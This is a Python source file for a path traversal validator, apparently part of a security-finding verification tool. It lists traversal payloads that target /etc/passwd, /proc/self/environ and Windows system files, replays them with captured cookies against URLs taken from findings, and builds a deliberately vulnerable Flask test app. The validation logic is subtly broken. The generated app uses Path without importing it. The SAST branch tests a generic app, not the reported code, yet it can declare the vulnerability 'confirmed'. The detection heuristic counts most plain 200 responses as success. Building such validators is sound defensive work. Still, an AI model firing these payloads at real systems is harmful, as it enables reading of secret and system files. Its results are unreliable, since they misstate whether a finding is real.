"""
Validator for Path Traversal vulnerabilities.
"""
import logging
from pathlib import Path
import json
import uuid
import re
import tempfile
import os
from typing import List, Dict, Any, Optional, Tuple

from api.core.validator import Validator, ValidationResult
from api.models.finding import Finding
from api.utils.docker_utils import DockerEnvironment
from api.utils.http_utils import (
    make_request, inject_payload_in_params, 
    inject_payload_in_body, detect_path_traversal_success,
    format_request_response
)

logger = logging.getLogger(__name__)

class PathTraversalValidator(Validator):
    """
    Validator for Path Traversal vulnerabilities.
    """
    
    def __init__(self):
        """
        Initialize the Path Traversal validator.
        """
        super().__init__()
        self.name = "Path Traversal Validator"
        self.payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..\\..\\..\\etc\\passwd",
            "/etc/passwd",
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../etc/hosts",
            "../../../Windows/win.ini",
            "C:\\Windows\\system.ini",
            "/var/log/auth.log",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "../../../../../../../../../../../../../../proc/version"
        ]
        self.docker_env = None
    
    def validate(self, finding: Finding) -> ValidationResult:
        """
        Validate Path Traversal vulnerability.
        
        Args:
            finding: The finding to validate
            
        Returns:
            ValidationResult with details of validation
        """
        logger.info(f"Validating Path Traversal vulnerability: {finding.id}")
        
        # Strategy depends on finding type (SAST, DAST, etc.)
        if finding.source_type == "DAST-ZAP" or finding.source_type == "DAST-Burp" or finding.source_type == "DAST-Generic":
            return self._validate_dast_finding(finding)
        else:
            # Default to SAST validation
            return self._validate_sast_finding(finding)
    
    def _validate_dast_finding(self, finding: Finding) -> ValidationResult:
        """
        Validate Path Traversal from DAST findings by replaying requests.
        
        Args:
            finding: The finding to validate
            
        Returns:
            ValidationResult with details of validation
        """
        # Extract URL and request/response details
        url = None
        request_method = "GET"
        request_data = None
        request_headers = {}
        request_cookies = {}
        
        # Get URL and request details from raw_data
        if finding.raw_data:
            if 'url' in finding.raw_data:
                url = finding.raw_data['url']
            
            # Try to parse request
            if 'request' in finding.raw_data and finding.raw_data['request']:
                request_lines = finding.raw_data['request'].splitlines()
                if request_lines:
                    # First line might contain method and URL
                    first_line = request_lines[0]
                    match = re.match(r'^(GET|POST|PUT|DELETE)\s+(\S+)', first_line)
                    if match:
                        request_method = match.group(1)
                        if not url:
                            url = match.group(2)
                    
                    # Parse headers
                    for line in request_lines[1:]:
                        if not line.strip():
                            break
                        
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            header_name = parts[0].strip()
                            header_value = parts[1].strip()
                            
                            if header_name.lower() == 'cookie':
                                # Parse cookies
                                for cookie in header_value.split(';'):
                                    if '=' in cookie:
                                        cookie_name, cookie_value = cookie.split('=', 1)
                                        request_cookies[cookie_name.strip()] = cookie_value.strip()
                            else:
                                request_headers[header_name] = header_value
                    
                    # Extract request body
                    if request_method in ['POST', 'PUT']:
                        body_start = None
                        for i, line in enumerate(request_lines):
                            if not line.strip():
                                body_start = i + 1
                                break
                        
                        if body_start and body_start < len(request_lines):
                            request_data = '\n'.join(request_lines[body_start:])
        
        # If no URL found, we can't validate
        if not url:
            return ValidationResult(
                is_exploitable=False,
                message="Could not extract URL from finding to validate Path Traversal"
            )
        
        # Check if URL has parameters that look like file paths
        has_file_param = False
        
        # Look for query parameters with common file extensions or path-like names
        file_param_patterns = [
            r'file=',
            r'path=',
            r'filepath=',
            r'document=',
            r'load=',
            r'read=',
            r'dir=',
            r'folder=',
            r'doc=',
            r'img=',
            r'image=',
            r'download=',
            r'view=',
            r'template=',
            r'page=',
            r'filename=',
            r'\.(?:php|html|jsp|asp|txt|log|ini|conf|cfg|xml)$'
        ]
        
        for pattern in file_param_patterns:
            if re.search(pattern, url, re.IGNORECASE):
                has_file_param = True
                break
        
        # If no file-like parameters found, still test but log a warning
        if not has_file_param:
            logger.warning(f"URL does not appear to have file-related parameters: {url}")
        
        # Try each payload
        evidence = []
        successful_payloads = []
        
        for payload in self.payloads:
            # For GET requests, inject into URL parameters
            if request_method == "GET":
                test_url = inject_payload_in_params(url, payload)
                
                try:
                    response = make_request(
                        test_url,
                        method=request_method,
                        headers=request_headers,
                        cookies=request_cookies,
                        timeout=10
                    )
                    
                    # Check if path traversal was successful
                    if detect_path_traversal_success(response):
                        successful_payloads.append(payload)
                        
                        # Create evidence
                        evidence_item = {
                            "type": "http_request",
                            "description": f"Path traversal with payload: {payload}",
                            "content": format_request_response(response.request, response)
                        }
                        evidence.append(evidence_item)
                
                except Exception as e:
                    logger.warning(f"Error testing path traversal payload: {e}")
                    continue
            
            # For POST requests, inject into body
            else:
                if not request_data:
                    continue
                
                # Try to inject into form data or JSON
                test_data = inject_payload_in_body(request_data, payload)
                
                try:
                    response = make_request(
                        url,
                        method=request_method,
                        data=test_data,
                        headers=request_headers,
                        cookies=request_cookies,
                        timeout=10
                    )
                    
                    # Check if path traversal was successful
                    if detect_path_traversal_success(response):
                        successful_payloads.append(payload)
                        
                        # Create evidence
                        evidence_item = {
                            "type": "http_request",
                            "description": f"Path traversal with payload: {payload}",
                            "content": format_request_response(response.request, response)
                        }
                        evidence.append(evidence_item)
                
                except Exception as e:
                    logger.warning(f"Error testing path traversal payload: {e}")
                    continue
        
        # Determine if exploitable
        is_exploitable = len(successful_payloads) > 0
        
        if is_exploitable:
            message = f"Confirmed Path Traversal vulnerability. {len(successful_payloads)} payloads were successful: {', '.join(successful_payloads[:3])}"
        else:
            message = "Could not confirm Path Traversal vulnerability. No test payloads were successful."
        
        return ValidationResult(
            is_exploitable=is_exploitable,
            message=message,
            evidence=evidence
        )
    
    def _validate_sast_finding(self, finding: Finding) -> ValidationResult:
        """
        Validate Path Traversal from SAST findings using Docker.
        
        Args:
            finding: The finding to validate
            
        Returns:
            ValidationResult with details of validation
        """
        # First check if we have file path and code to analyze
        if not finding.file_path:
            return ValidationResult(
                is_exploitable=False,
                message="No file path available in finding to validate Path Traversal"
            )
        
        # Setup a Docker environment for testing
        try:
            self.docker_env = DockerEnvironment()
            if not self.docker_env.setup():
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to set up Docker environment for validation"
                )
            
            # Create container with necessary packages
            self.docker_env.create_container(name_prefix="path_traversal_validator_", ports={8080: 8080})
            
            # Install necessary packages
            self.docker_env.install_python_package("flask")
            self.docker_env.install_python_package("requests")
            
            # Create a test application based on the finding
            test_app_path = self._create_test_app(finding)
            
            if not test_app_path:
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to create test application for Path Traversal validation"
                )
            
            # Copy the test app to the container
            if not self.docker_env.copy_to_container(test_app_path, "/tmp/test_path_traversal_app.py"):
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to copy test application to Docker container"
                )
            
            # Create a test script to check for Path Traversal
            test_script_path = self._create_test_script()
            
            if not test_script_path:
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to create test script for Path Traversal validation"
                )
            
            # Copy the test script to the container
            if not self.docker_env.copy_to_container(test_script_path, "/tmp/test_path_traversal.py"):
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to copy test script to Docker container"
                )
            
            # Create test files
            self.docker_env.execute_command("mkdir -p /tmp/testfiles")
            self.docker_env.execute_command("echo 'This is a test file' > /tmp/testfiles/test.txt")
            self.docker_env.execute_command("echo 'This is a secret file' > /tmp/testfiles/secret.txt")
            self.docker_env.execute_command("chmod -R 755 /tmp/testfiles")
            
            # Start the test app in the background
            self.docker_env.execute_command("nohup python /tmp/test_path_traversal_app.py > /tmp/app.log 2>&1 &")
            
            # Wait for the app to start
            self.docker_env.execute_command("sleep 2")
            
            # Execute the test script
            exit_code, stdout, stderr = self.docker_env.execute_command("python /tmp/test_path_traversal.py")
            
            # Check application log if needed
            app_log_code, app_log, _ = self.docker_env.execute_command("cat /tmp/app.log")
            
            # Parse the results
            if exit_code != 0:
                return ValidationResult(
                    is_exploitable=False,
                    message=f"Error executing test script: {stderr}"
                )
            
            try:
                result = json.loads(stdout)
                is_exploitable = result.get("is_exploitable", False)
                successful_payloads = result.get("successful_payloads", [])
                
                evidence = []
                for test in result.get("tests", []):
                    evidence_item = {
                        "type": "path_traversal_test",
                        "description": f"Path Traversal test with payload: {test['payload']}",
                        "content": json.dumps(test, indent=2)
                    }
                    evidence.append(evidence_item)
                
                if is_exploitable:
                    message = f"Confirmed Path Traversal vulnerability. {len(successful_payloads)} payloads were successful: {', '.join(successful_payloads[:3])}"
                else:
                    message = "Could not confirm Path Traversal vulnerability. No test payloads were successful."
                
                return ValidationResult(
                    is_exploitable=is_exploitable,
                    message=message,
                    evidence=evidence
                )
            
            except json.JSONDecodeError:
                return ValidationResult(
                    is_exploitable=False,
                    message=f"Error parsing test results: {stdout}"
                )
        
        finally:
            # Clean up
            if self.docker_env:
                self.docker_env.cleanup()
                self.docker_env = None
    
    def _create_test_app(self, finding: Finding) -> Optional[str]:
        """
        Create a Flask application for testing Path Traversal.
        
        Args:
            finding: The finding to validate
            
        Returns:
            Path to the created application, or None if failed
        """
        try:
            # Create a temporary file
            fd, path = tempfile.mkstemp(suffix=".py", prefix="path_traversal_test_app_")
            
            # Generate application code
            code = """
from flask import Flask, request, send_file, abort
import os

app = Flask(__name__)

# Base directory for files
FILES_DIR = '/tmp/testfiles'

@app.route('/')
def index():
    return '''
        <html>
            <head><title>Path Traversal Test</title></head>
            <body>
                <h1>Path Traversal Test Application</h1>
                <h2>Vulnerable Endpoints</h2>
                <ul>
                    <li><a href="/vulnerable?file=test.txt">Vulnerable GET</a></li>
                    <li>
                        <form action="/vulnerable_post" method="POST">
                            <input type="text" name="file" value="test.txt">
                            <button type="submit">Vulnerable POST</button>
                        </form>
                    </li>
                </ul>
                <h2>Safe Endpoints</h2>
                <ul>
                    <li><a href="/safe?file=test.txt">Safe GET</a></li>
                </ul>
            </body>
        </html>
    '''

@app.route('/vulnerable')
def vulnerable():
    # Vulnerable to path traversal - directly uses user input
    file_name = request.args.get('file', '')
    
    # Construct file path (vulnerable way)
    file_path = Path(FILES_DIR) / file_name
    
    try:
        return send_file(file_path)
    except Exception as e:
        return f"Error: {str(e)}", 404

@app.route('/vulnerable_post', methods=['POST'])
def vulnerable_post():
    # Also vulnerable to path traversal
    file_name = request.form.get('file', '')
    
    # Construct file path (vulnerable way)
    file_path = Path(FILES_DIR) / file_name
    
    try:
        return send_file(file_path)
    except Exception as e:
        return f"Error: {str(e)}", 404

@app.route('/safe')
def safe():
    # Safe version - validates file name
    file_name = request.args.get('file', '')
    
    # Prevent path traversal by checking that there are no path separators
    if '/' in file_name or '\\\\' in file_name or '..' in file_name:
        abort(403)  # Forbidden
    
    # Only allow specific files
    allowed_files = ['test.txt']
    if file_name not in allowed_files:
        abort(403)  # Forbidden
    
    # Construct file path safely
    file_path = Path(FILES_DIR) / file_name
    
    try:
        return send_file(file_path)
    except Exception as e:
        return f"Error: {str(e)}", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
"""
            
            # Write the code to the file
            with os.fdopen(fd, 'w') as f:
                f.write(code)
            
            return path
        
        except Exception as e:
            logger.error(f"Error creating test application: {e}", exc_info=True)
            return None
    
    def _create_test_script(self) -> Optional[str]:
        """
        Create a Python script to test for Path Traversal.
        
        Returns:
            Path to the created script, or None if failed
        """
        try:
            # Create a temporary file
            fd, path = tempfile.mkstemp(suffix=".py", prefix="path_traversal_test_")
            
            # Generate test code
            code = """
import requests
import json
import re
import os

# Test server
SERVER_URL = "http://localhost:8080"

# Payloads to test
PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\\\..\\\\..\\\\etc\\\\passwd",
    "/etc/passwd",
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../etc/hosts",
    "../../../../../../../../../../../../../../proc/version",
    "../testfiles/secret.txt",
    "..%2Ftestfiles%2Fsecret.txt",
    "..\\\\testfiles\\\\secret.txt"
]

def detect_path_traversal_success(response):
    '''Detect successful path traversal attack.'''
    # Common file content patterns
    unix_patterns = [
        r'root:.*?:0:0:',  # /etc/passwd
        r'# User Database',
        r'nobody:.*?:99:99:',
        r'# /etc/hosts',
        r'127\.0\.0\.1\s+localhost',
        r'::1\s+localhost',
        r'Linux version',  # /proc/version
        r'This is a secret file'  # Our test secret file
    ]
    
    # Check for common file content patterns
    for pattern in unix_patterns:
        if re.search(pattern, response.text):
            return True
    
    # Check for suspiciously successful responses
    if (response.status_code == 200 and 
        (len(response.text) > 0) and
        ('file not found' not in response.text.lower()) and
        ('not found' not in response.text.lower()) and
        ('error' not in response.text.lower())):
        # This is a heuristic - a 200 response with content that doesn't contain error messages
        # might indicate success, but could also be a false positive
        return True
    
    return False

def test_path_traversal():
    '''Test path traversal payloads.'''
    results = {
        "is_exploitable": False,
        "successful_payloads": [],
        "tests": []
    }
    
    # Endpoints to test
    endpoints = [
        # Vulnerable endpoint (GET)
        {"url": SERVER_URL + "/vulnerable", "method": "GET", "param": "file"},
        # Vulnerable endpoint (POST)
        {"url": SERVER_URL + "/vulnerable_post", "method": "POST", "param": "file"},
        # Safe endpoint
        {"url": SERVER_URL + "/safe", "method": "GET", "param": "file"}
    ]
    
    for endpoint in endpoints:
        url = endpoint["url"]
        method = endpoint["method"]
        param = endpoint["param"]
        
        # First test with safe value
        safe_value = "test.txt"
        safe_params = {param: safe_value} if method == "GET" else None
        safe_data = {param: safe_value} if method == "POST" else None
        
        try:
            safe_response = requests.request(method, url, params=safe_params, data=safe_data, timeout=5)
            safe_test = {
                "endpoint": url,
                "method": method,
                "parameter": param,
                "payload": safe_value,
                "status_code": safe_response.status_code,
                "content_length": len(safe_response.text),
                "success": safe_response.status_code == 200
            }
            
            results["tests"].append(safe_test)
            
            # Now test with path traversal payloads
            for payload in PAYLOADS:
                traversal_params = {param: payload} if method == "GET" else None
                traversal_data = {param: payload} if method == "POST" else None
                
                try:
                    traversal_response = requests.request(method, url, params=traversal_params, data=traversal_data, timeout=5)
                    is_successful = detect_path_traversal_success(traversal_response)
                    
                    test_result = {
                        "endpoint": url,
                        "method": method,
                        "parameter": param,
                        "payload": payload,
                        "status_code": traversal_response.status_code,
                        "content_length": len(traversal_response.text),
                        "success": is_successful,
                        "response_excerpt": traversal_response.text[:200]  # Include part of the response
                    }
                    
                    results["tests"].append(test_result)
                    
                    # If successful, mark as exploitable
                    if is_successful and not url.endswith("/safe"):  # Exclude the safe endpoint
                        results["is_exploitable"] = True
                        results["successful_payloads"].append(payload)
                
                except Exception as e:
                    test_result = {
                        "endpoint": url,
                        "method": method,
                        "parameter": param,
                        "payload": payload,
                        "error": str(e)
                    }
                    results["tests"].append(test_result)
        
        except Exception as e:
            endpoint_result = {
                "endpoint": url,
                "method": method,
                "error": str(e)
            }
            results["tests"].append(endpoint_result)
    
    # Remove duplicates from successful payloads
    results["successful_payloads"] = list(set(results["successful_payloads"]))
    
    return results

if __name__ == "__main__":
    results = test_path_traversal()
    print(json.dumps(results, indent=2))
"""
            
            # Write the code to the file
            with os.fdopen(fd, 'w') as f:
                f.write(code)
            
            return path
        
        except Exception as e:
            logger.error(f"Error creating test script: {e}", exc_info=True)
            return None
    
    def cleanup(self) -> None:
        """
        Clean up resources.
        """
        if self.docker_env:
            self.docker_env.cleanup()
            self.docker_env = None
